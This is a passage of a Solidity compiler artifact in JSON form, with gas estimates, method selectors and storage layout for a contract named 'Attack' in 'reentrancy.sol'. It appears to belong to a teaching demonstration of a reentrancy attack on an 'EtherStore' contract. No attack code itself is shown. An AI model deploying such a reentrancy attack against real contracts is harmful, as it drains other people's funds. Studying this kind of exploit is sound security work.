0xE 0xEF MSTORE8 SMOD PUSH5 0x736F6C6343 STOP ADDMOD AND STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "187600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"attack()": "infinite",
						"etherStore()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"etherStore()": "acd2e6e5"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 70,
						"contract": "reentrancy.sol:Attack",
						"label": "etherStore",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(EtherStore)67"
					}
				],
				"types": {
					"t_contract(EtherStore)67": {
						"encoding": "inplace",
						"label": "contract EtherStore",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}